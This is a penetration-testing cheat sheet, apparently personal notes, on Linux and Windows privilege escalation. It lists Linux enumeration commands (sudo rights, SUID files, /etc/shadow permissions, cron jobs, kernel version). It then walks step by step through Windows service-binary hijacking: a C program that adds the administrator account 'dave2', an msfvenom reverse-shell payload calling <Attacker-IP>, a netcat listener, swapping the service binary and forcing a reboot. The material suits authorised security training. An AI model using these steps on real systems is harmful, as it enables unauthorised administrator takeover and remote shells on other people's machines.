### Privilege Escalation -
#### Linux
- `sudo -V` → Vulnerable sudo version
- `ls -al /etc/passwd /etc/shadow` → Check if passwd is writable or shadow is readable
- `sudo -l` → Sudoer permission for current user
- `find / -perm /4000 -type f 2>/dev/null` → List of SUID files
- `find / -group <group-user> 2>/dev/null` → Check which file are accessible to current user group
- `cat /etc/crontab` AND `cron -l` AND `ls -lah /etc/cron*` AND `cat /var/log/syslog` AND `/usr/sbin/CRON -f -P`  → Cron job enumeration
- `uname -r` → Vulnerable Kernel Version
	- Use this to find exploit for vulnerable version → [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
#### Windows
- `PS> whoami /priv` → Current user privileges
- `Windows Kernel Exploits` - [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits?tab=readme-ov-file)
- Service Binary Hijacking
	- Each Windows Service has an associated binary file. These binary files (.exe) are executed when service is started. This method exploits the fact that the binary of running service can be replaced with exploit executable. For demonstration, we will assume our target service is `BinaryService`
    - Identify the Services that are running and path to there binary
	    - `PS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		- Alternative - `PS> Get-Service | Select Name,Status | Where-Object {$_.Status -like 'Running'}`
	- Before starting once check if we can restart BinaryService. Or atleast our user has required permissions to reboot system.
		- Check `BinaryService` can be restarted
			- `PS> sc.exe stop BinaryService`
			- `PS> net stop BinaryService`
		- Check system can be rebooted
			- `PS> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'BinaryService'}` → Check if StartMode is set to automatic, that will enable us to reboot system (indirectly restart system by rebooting)
			- `PS> whoami /priv` → Our user should have `SeShutDownPrivilege` in list of permissions to reboot system
	- Check permission for suspicious paths found from previous commands (usually not in `C:\Program Files\*`,`C:\Program Files (x86)\*` , but could be)
        - `PS> icacls <Path-to-BinaryService>` - Check if the permission is 'F' or 'M' for Everyone or our BUILTIN\Users
	- If we have modification permission, prepare an exploit executable
        - Executable to add new administrative user - `exploit.c`
          ```
          #include <stdlib.h>
          int main(){
          	int i;
          	i = system("net user dave2 password123! /add");
          	i = system("net localgroup administrators dave2 /add");
          	return 0;
          }
          ```
	        - `Kali> x86_64-w64-mingw32-gcc exploit.c -o exploit.exe` and share `exploit.exe` to target
	    - Reverse shell payload executable
            - `Kali> msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > exploit.exe`
			- Share executable with target
			- `Kali> nc -nlvp 4444`
	- Now, we need to replace our exploit with actual service binary. Let the service binary be `binary.exe`.
        - `PS> Move \Path\To\Binary\binary.exe .\binary.exe.bak`
		- `PS> Copy .\exploit.exe \Path\To\Binary\binary.exe`
		- `PS> icacls binary.exe /grant Everyone:F`
	- Perform binary execution
        - If restart of service allowed
            - via sc.exe
                - `PS> sc.exe stop BinaryService`
				- `PS> sc.exe start BinaryService`
			- Alternative -
                - `PS> net stop BinaryService`
				- `PS> net start BinaryService`
		- If restart of service not allowed
            - `PS> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'BinaryService'}` → Check if StartMode is set to automatic, that will enable us to reboot system (indirectly restart system by rebooting)
			- `PS> whoami /priv` → Our user should have `SeShutDownPrivilege` in list of permissions to reboot system
			- If all above conditions are satisfied, execute command - `shutdown /r /t 0`
	- Check changes after service restarts
        - `PS> Get-LocalGroupMember Administrators` - Check if `dave2` user is added as Administrators user
            - OR
		- `Got reverse shell on port 4444 on local system`
